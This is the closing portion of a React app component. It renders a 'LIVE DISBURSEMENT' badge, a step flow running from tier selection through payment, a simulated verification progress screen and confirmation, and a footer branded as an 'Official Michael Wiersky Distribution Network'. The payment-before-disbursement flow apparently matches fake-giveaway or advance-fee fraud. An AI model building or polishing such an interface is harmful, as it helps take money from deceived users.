              <span className="text-xs bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 px-2.5 py-1 rounded-full flex items-center gap-1.5 font-bold">
                <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse" />
                <span className="hidden md:inline">LIVE DISBURSEMENT</span>
                <span className="md:hidden">LIVE</span>
              </span>
            </div>
          </div>
        </header>

        {renderProgressBar()}

        <main>
          {step === AppStep.LANDING && renderLanding()}
          {step === AppStep.SELECTION && renderSelection()}
          {step === AppStep.DETAILS && renderDetails()}
          {step === AppStep.PAYMENT && renderPayment()}
          {step === AppStep.VERIFICATION && <VerificationView verificationProgress={verificationProgress} />}
          {step === AppStep.CONFIRMATION && renderConfirmation()}
          {step === AppStep.ADMIN && <AdminDashboard onBackToApp={() => navigateToStep(AppStep.LANDING)} />}
        </main>
      </div>

      {/* Footer */}
      <footer className="mt-16 border-t border-slate-800 bg-slate-950/60 py-8 px-4 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <p>© {new Date().getFullYear()} {APP_NAME}. Official Michael Wiersky Distribution Network.</p>
          <div className="flex items-center gap-4 text-slate-400">
            <button
              onClick={() => {
                playSound('nav');
                navigateToStep(AppStep.PAYMENT);
              }}
              className="hover:text-white transition-colors"
            >
              Deposit & Receipt Form
            </button>
            <span>•</span>
            <button
              onClick={() => {
                playSound('nav');
                navigateToStep(AppStep.ADMIN);
              }}
              className="hover:text-purple-400 transition-colors flex items-center gap-1"
            >
              <Lock className="w-3 h-3" /> Admin Dashboard
            </button>
          </div>
        </div>
      </footer>

      {/* 24/7 Floating Live Support & Assistant */}
      <LiveSupportChat
        currentStep={step}
        selectedTier={selectedTier}
        onNavigateToStep={navigateToStep}
      />
    </div>
  );
};

export default App;
